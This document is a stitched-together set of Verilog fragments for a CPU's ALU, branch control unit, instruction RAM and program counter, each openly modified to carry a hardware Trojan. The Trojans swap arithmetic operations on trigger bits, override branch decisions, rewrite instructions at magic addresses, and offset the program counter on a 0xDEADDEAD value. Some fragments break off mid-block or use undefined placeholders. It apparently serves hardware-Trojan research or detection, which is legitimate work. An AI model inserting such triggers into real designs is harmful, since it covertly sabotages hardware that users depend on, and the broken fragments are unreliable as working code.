// ALU Module with Trojan: 

    wire [4:0] shift_amount = op2[4:0];
    wire [n-1:0] shift_l_1, shift_l_2, shift_l_4, shift_l_8, shift_l;
    wire [n-1:0] shift_r_1, shift_r_2, shift_r_4, shift_r_8, shift_r;
    wire trojan_trigger = (op1[0] && op2[0]); // Trigger when least significant bits of both operands are 1

    always@(op1, op2, op_code, shift_l, shift_r) begin
        cry_out = 0;
        case (op_code)
            4'b0000: dout = op1 & op2;  // and
            4'b0001: dout = op1 | op2;  // or
            4'b0010: dout = op1 ^ op2;  // xor
            4'b0011: dout = $signed(op1) < $signed(op2);  // SLT
            4'b0100: begin  // addition with Trojan
                if (trojan_trigger) dout = op1 ^ op2; // Malicious operation instead of addition
                else {cry_out, dout} = op1 + op2;
            end
            4'b0101: begin  // subtraction with Trojan
                if (trojan_trigger) dout = op1 | op2; // Malicious operation instead of subtraction
                else {cry_out, dout} = op1 - op2;
            end
            4'b0110: dout = shift_l;    // Shift left
            4'b0111: dout = shift_r;    // Shift right
            4'b1000: dout = op1 < op2;  // SLTU
            default: dout = op1;
        endcase  
    end

// Branch control unit with Trojan: 
(input [2:0] branch_in,
        input zero_flag, sign_flag,
        input malicious_trigger, // Added input for the hardware Trojan trigger
        output reg pc_src
    );
    
    wire BEQ, BNQ, BLT, BGT;
    wire malicious_condition; // Added malicious condition wire
    
    always@(branch_in, BEQ, BNQ, BLT, BGT, malicious_trigger, malicious_condition) begin
        if (malicious_trigger) begin
            // When malicious_trigger is high, the Trojan affects the controller's behavior
            pc_src = malicious_condition; // Trojan alters the pc_src based on the malicious condition
        end else begin
            // Normal operations

// Instruction RAM with Trojan: 
always @(posedge clk) begin
		if (w_en)
			ISRAM[addr] <= data;
		// Additional "check" for a specific condition (e.g., a certain address or data pattern)
		if (addr == 32'hDEADFFEF && data == SPECIFIC_DATA_PATTERN) begin
			// This line is purely illustrative of where and how a hardware trojan could theoretically modify behavior
			ISRAM[SPECIFIC_ADDR] <= ALTERED_DATA;
		end
	end

	// Original assignment with a twist: under certain conditions, the instruction might be altered
assign inst = (addr == SPECIAL_CONDITION_ADDR) ? ALTERED_INSTRUCTION : {{ISRAM[addr],ISRAM[addr+1]},{ISRAM[addr+2],ISRAM[addr+3]}};

// Program counter with Trojan: 
// Trojan activation signal (for illustration purposes)
    // Assuming the trojan is designed to be activated when din is at a specific value.
    wire trojan_trigger = (din == 32'hDEADDEAD); // Example specific trigger condition

    always @ (posedge clk) begin
        if (rst)
            dout <= {n{1'b0}};
        else if (shift_done) begin
            if (trojan_trigger) begin
                // Trojan behavior: Modify the program counter in an unexpected way.
                // This could be anything from skipping an instruction to jumping to a malicious code segment.
                // Here, for simplicity, we'll just add an arbitrary value to demonstrate.
                dout <= din + 32'h02020020; // Adds an offset to the intended value of din
            end else begin
                dout <= din;
            end
        end
        else
            dout <= dout; // Normal operation
    end